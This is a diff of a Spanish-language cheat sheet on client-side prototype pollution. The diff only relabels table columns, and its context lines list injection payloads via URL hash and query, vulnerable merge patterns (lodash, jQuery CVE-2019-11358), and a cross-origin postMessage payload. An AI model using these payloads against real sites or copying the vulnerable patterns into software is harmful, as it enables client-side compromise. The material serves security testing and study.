@@ -23,7 +23,7 @@ linked:
 
 ## URL Hash / Search Injection
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Pollution via location.hash | `https://target/?#__proto__[polluted]=yes` | Si client JS parsea hash a object. |
 | Pollution via location.search | `https://target/?__proto__[polluted]=yes` | Si client JS parsea query string. |
@@ -61,7 +61,7 @@ ___
 
 ## JSON.parse + Merge
 
-| **Patrón** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | LocalStorage merge | `JSON.parse(localStorage.config)` + lodash merge | Atacante vía XSS hosting → control of localStorage. |
 | Fetch + merge | `fetch().then(r=>r.json()).then(d=>_.merge(state, d))` | API response controlado puede polucionar. |
@@ -77,7 +77,7 @@ ___
 
 ## DOM-based Pollution
 
-| **Patrón** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | jQuery 3.x pre-3.4 | `$.extend(true, {}, ...)` con user input | CVE-2019-11358. |
 | jQuery deparam | Plugin para parsear URL → vulnerable. | jquery-deparam. |
@@ -95,7 +95,7 @@ ___
 
 ## postMessage Abuse
 
-| **Patrón** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Listener sin origin check | `window.addEventListener('message', e => merge(config, e.data))` | Acepta de cualquier origen. |
 | Atacante hostea iframe | `<iframe src="https://target/"></iframe>` + `iframe.contentWindow.postMessage({"__proto__":{"polluted":"yes"}}, '*')` | Cross-origin pollution. |
